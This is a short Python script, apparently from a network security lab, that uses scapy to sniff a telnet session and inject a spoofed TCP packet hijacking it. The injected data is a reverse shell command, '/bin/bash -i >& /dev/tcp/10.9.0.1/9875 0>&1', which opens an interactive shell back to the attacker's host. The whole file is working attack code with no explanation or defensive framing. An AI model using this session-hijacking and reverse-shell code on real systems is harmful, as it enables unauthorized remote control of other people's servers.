#!/usr/bin/env python3

import sys
from scapy.all import *

interface = "br-dfb1dc5953e4"

def spoof_tcp(pkt):
    # spoof packet from user to the victim server
    ip   = IP(src = pkt[IP].dst, dst = pkt[IP].src)
    tcp  = TCP(sport = pkt[TCP].dport, dport = pkt[TCP].sport, flags = "A", seq = pkt[TCP].ack, ack = pkt[TCP].seq+1)
    data = "\r /bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1 \r"
    
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, iface = interface, verbose = 0)

# sniff TCP packet from the telnet client 
pkt = sniff(iface = interface, filter = "tcp and src host 10.9.0.5 and src port 23", prn = spoof_tcp)
